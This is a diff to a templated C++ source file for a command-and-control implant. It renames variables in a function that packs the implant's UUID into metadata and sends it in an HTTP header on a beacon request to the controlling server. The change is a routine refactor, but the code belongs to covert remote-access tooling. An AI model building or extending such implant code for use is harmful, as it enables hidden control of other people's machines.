@@ -37,15 +37,15 @@ nlohmann::json get(std::string implant_uuid) {
     // Note: pass a copy of implant_uuid in, as we are going to be potentially heavily editing it. 
     std::vector<uint8_t> http_response_buffer;
 
-    // Create metadata
-    std::map<std::string, std::string> metadata;
-    metadata["implant_uuid"] = implant_uuid;
+    // Create metadata map
+    std::map<std::string, std::string> metadata_map;
+    metadata_map["implant_uuid"] = implant_uuid;
 
     std::vector<uint8_t> metadata_as_msgpack;
-    create_metadata(metadata, metadata_as_msgpack);
+    create_metadata(metadata_map, metadata_as_msgpack);
 
     // Hold bytes in string, as all the transforms want a string
-    std::string metadata(metadata_as_msgpack.begin(), metadata_as_msgpack.end());
+    std::string transformed_metadata_for_server(metadata_as_msgpack.begin(), metadata_as_msgpack.end());
     std::vector<std::wstring> headers;
 
     // --- Transforms ---
@@ -56,7 +56,7 @@ nlohmann::json get(std::string implant_uuid) {
 
     [# IF MC2 says it wants a header for where to find the metadata... #]
     [%- if http_get_client_metadata_terminator == "header" %]
-    headers.push_back(L"[[ http_get_client_metadata_terminator_value ]]: " + std::wstring(metadata.begin(), metadata.end()));
+    headers.push_back(L"[[ http_get_client_metadata_terminator_value ]]: " + std::wstring(transformed_metadata_for_server.begin(), transformed_metadata_for_server.end()));
     [%- endif %]
 
     if (HTTP_GET(headers, http_response_buffer)) {
